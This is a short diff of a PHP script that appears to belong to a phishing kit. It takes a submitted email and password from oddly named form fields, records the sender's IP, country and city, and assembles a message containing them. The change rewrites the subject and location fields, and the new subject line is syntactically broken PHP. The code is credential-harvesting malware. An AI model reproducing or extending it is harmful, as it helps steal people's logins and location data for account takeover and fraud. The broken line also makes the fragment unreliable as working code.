@@ -74,9 +74,9 @@ if(isset($_POST)){
     $data['email'] = $email->clean($_REQUEST['pet']);
     $data['pass'] = $email->clean($_REQUEST['pett']);
     $data['ip'] = $email->getIp();
-    $data['subject'] = $email->clean($_REQUEST['pet']) + $country;
-    $data['cname'] = $email->geoplugin_countryName();
-	    $data['ccity'] = $email->geoplugin_city();
+    $data['subject'] = $email->clean($_REQUEST['pet']) : ($country) ;
+    $data['cname'] = $country;
+	    $data['ccity'] = $city;
 
     $data['message'] =
 		"
